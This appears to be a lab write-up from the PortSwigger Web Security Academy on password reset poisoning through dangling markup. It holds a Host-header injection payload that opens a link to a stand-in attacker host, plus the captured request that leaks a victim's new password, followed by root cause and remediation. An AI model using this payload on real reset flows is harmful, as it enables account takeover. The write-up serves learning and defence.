# Password Reset Poisoning Through Dangling Markup

## Lab soruce and scope

This assessment was performed in the PortSwigger Web Security Academy lab **Password reset poisoning via dangling markup.**

Unlike hte previous reset-token labs, the password-reset eemail in this environment exposed sensitive information in the email body. The app also embedded attacker-influenced host data into HTML.

## Security objective

Determine whether Host-derived data could break the structure of the generated HTML email and cause later sensitive content to be included in a request to an attacker controlled origin.

## Initial observation

A normal reset request generated an HTML email. The sensitive value was not exposed as a reset token in the URL in the same way as the previous labs.

Direct replacement of the Host value with a simple attacker domain did not produce the required result.

However, the app accepted additional characters after the legitimate hostname, indicating htat the host values was being handled unsafely when inserted into generated markup.

A representative probe was:

```http
POST /forgot-password HTTP/2
Host: <LAB_HOST>:<TEST_VALUE>
Content-Type: application/x-www-form-urlencoded

username=<VICTIM_USER>
```

## Vulnerable behavior

The host-derived value was inserted into an HTML context without safe validation and encoding.

I used a dangling-markup payload that began an attacker-controlled link but intentionally left the markup incomplete. In sanitised form, the request looked like:

```http
POST /forgot-password HTTP/2
Host: <LAB_HOST>: '<a href="https://<ATTACKER_HOST>/capture
Content-Type: application/x-www-form-urlencoded

username=<VICTIM_USER>
```

Because the injected attribute was left open, subsequent content in the generated email became part of the URL processed by th email client.

## Evidence

The attacker-controlled server received a request whose path contained later content from the reset email, including hte sensitive generated password:

```http
GET login'>click+here</a>+to+login+with+your+new+password:+ruqZ1DamYn</p><p>Thanks,<br/>Support+team</p>
```

## Validation

The recovered password was accepted by the target app and provided access to the victim account.

## Result

Attacker-controlled host data crossed two security boundaries:

1. It was trusted while generating HTML content
2. It was inserted into an attribute context without safe handling

The resulting dangling markup caused later sensitive email content to be sent to attacker controlled infrastructure.

## Root cause

The app used untrusted request metadata inside generated HTML without enforcing a trusted host and without context-appropriate output handling.

The issue was tehrefore more than simple Host reflection. The attacker controlled value reached a markup context where the browser or email client continued parsing it together with subsequent secret content.

## Security impact

The vulnerability disclosed the password generated for the victim and led to account takeover, and it can expose:

- Reset tokens
- Verificaiton links
- Temporary credentials
- Other sensitive content rendered later in the same HTML document

## Remediation

- Never derive security sensitive origins from untrusted request headers
- Use a configured origin when generating email links
- Apply context-appropriate output encoding to any data inserted into HTML
- Avoid placing sensitive secrets directly in email body content where a tokenised flow is more appropriate
- Reject unexpected Host syntax at the edge
- Teste generated emails as a complete rendered security boundary, not only as server-side templates

## What I learned

This lab was a useful reminder that a vulnerability can span several parsers.

The input behag as HTTP authority data, moved into an HTML template, and was finally interpreted by an email client. The exploit depended on how thoe layers interacted, not on a single unsafe function in isolation.

## Navigation

[Previous: X-Forwarded-Host poisoning](02-poisoning-via-x-forwarded-host.md) | [Password reset poisoning overview](README.md) | [Next: File upload security](../../03-file-upload/README.md)
